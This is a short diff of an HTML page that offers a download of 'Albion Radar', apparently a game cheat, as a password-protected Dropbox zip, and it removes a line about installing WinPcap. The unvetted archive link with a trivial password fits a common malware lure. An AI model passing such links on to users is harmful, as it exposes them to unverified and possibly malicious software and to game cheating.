@@ -18,7 +18,6 @@
 <p><h1 align="center"><strong><a href='https://www.dropbox.com/scl/fi/0s9kdl9eqxg1colo9i97p/albion_radar.zip?rlkey=77a7ndr2pxg5zubwnw2qdrit4&dl=1'>DOWNLOAD ALBION RADAR</a></strong></h1></p>
 <p><h3 align="center"><strong>password is "123"</strong></h3></p>
 <p></p><h2 style="text-align: center;"><strong>Requirements</strong></h2></p>
-<p><em>Install <a href='https://www.winpcap.org/'> Wincap</a></em></p>
 </span>
 <p><img src="https://i.imgur.com/EB5SjGo.jpg" /></p>
 <br>
